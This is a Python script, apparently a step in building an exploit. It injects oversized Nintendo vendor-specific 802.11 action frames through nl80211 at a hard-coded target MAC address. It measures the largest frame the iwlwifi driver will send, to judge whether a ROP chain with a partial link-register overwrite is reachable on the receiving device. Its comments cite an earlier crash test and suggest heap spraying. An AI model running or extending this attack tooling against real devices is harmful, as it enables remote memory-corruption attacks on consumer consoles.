#!/usr/bin/env python3
"""Test maximum NL80211_CMD_FRAME size accepted by iwlwifi.

For the ROP exploit, we need body_size >= 0xAA6 (2726 bytes).
Total 802.11 frame = 24 (MAC header) + 12 (lp2p header) + body = ~2762 bytes.
This tests whether iwlwifi accepts management frames of that size.
"""

import os
import struct
import socket
import time

IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
FREQ = 2412

def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla) % 4:
        nla += b'\x00' * (4 - len(nla) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def try_send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 200 + len(frame_bytes)
    s.bind((pid, 0))
    s.settimeout(1.0)

    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    seq = 99999
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, seq, pid)

    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:  # NLMSG_ERROR
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_test_frame(body_size):
    src_mac = bytes.fromhex("227ccee0bd56")
    frame = bytearray()
    frame += b"\xd0\x00"       # Action frame
    frame += b"\x00\x00"       # Duration
    frame += SWITCH_MAC         # dst
    frame += src_mac            # src
    frame += SWITCH_MAC         # bssid
    frame += b"\x00\x00"       # seq ctrl
    # Action body: vendor-specific
    frame += b"\x7f"           # Category: Vendor Specific
    frame += b"\x00\x22\xaa"   # Nintendo OUI
    frame += b"\x04"           # Type
    frame += b"\x01"           # Version
    frame += struct.pack(">H", 0x0101)  # frame_type = ADVERTISE
    frame += b"\x00\x00\x00\x00"  # reserved
    # Body
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, 0x0100)  # small safe payload_size
    frame += body
    return bytes(frame)


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE} (ifindex={ifindex})")
    print(f"nl80211 family: {fam_id}")
    print()

    # Need body_size=0xAA6 for partial LR overwrite
    # Total frame = 24 (MAC) + 12 (lp2p) + body
    test_sizes = [
        0x0570,  # 1392 - confirmed working (crash test)
        0x0600,  # 1536
        0x0700,  # 1792
        0x0800,  # 2048
        0x08F4,  # 2292 - max for 802.11 legacy (2304 payload)
        0x0900,  # 2304 - at the legacy limit
        0x0940,  # 2368
        0x0980,  # 2432
        0x0A00,  # 2560
        0x0A80,  # 2688
        0x0AA6,  # 2726 - MINIMUM for partial LR overwrite
        0x0AB0,  # 2736
        0x0B00,  # 2816
        0x0C00,  # 3072
        0x0F00,  # 3840
        0x1000,  # 4096
    ]

    print(f"{'body_size':>10} {'frame_total':>12} {'result':>12}")
    print("-" * 40)

    max_ok = 0
    for bs in test_sizes:
        frame = build_test_frame(bs)
        total = len(frame)
        err = try_send_frame(fam_id, ifindex, frame)
        if err == 0:
            status = "OK"
            max_ok = bs
        elif err == -110:
            status = "TIMEOUT"
        elif isinstance(err, int):
            import errno
            ename = errno.errorcode.get(-err, str(err))
            status = f"ERR({err}) {ename}"
        else:
            status = f"ERR: {err}"
        print(f"  0x{bs:04x}    {total:>6}B    {status}")
        time.sleep(0.05)

    print()
    print(f"Max accepted body_size: 0x{max_ok:04x} ({max_ok} bytes)")
    print(f"Max frame total: {24 + 12 + max_ok} bytes")
    needed = 0xAA6
    if max_ok >= needed:
        print(f"[+] PARTIAL LR OVERWRITE IS FEASIBLE (need >= 0x{needed:04x})")
    else:
        payload_reach = max_ok - 0x1DC if max_ok > 0x1DC else 0
        shortfall = needed - max_ok
        print(f"[-] Frame too small for partial LR overwrite")
        print(f"    Controlled payload: 0x{payload_reach:04x} bytes")
        print(f"    Shortfall: 0x{shortfall:04x} bytes ({shortfall} bytes)")
        print(f"    Need heap spray or fragmentation to bridge the gap")


if __name__ == "__main__":
    main()
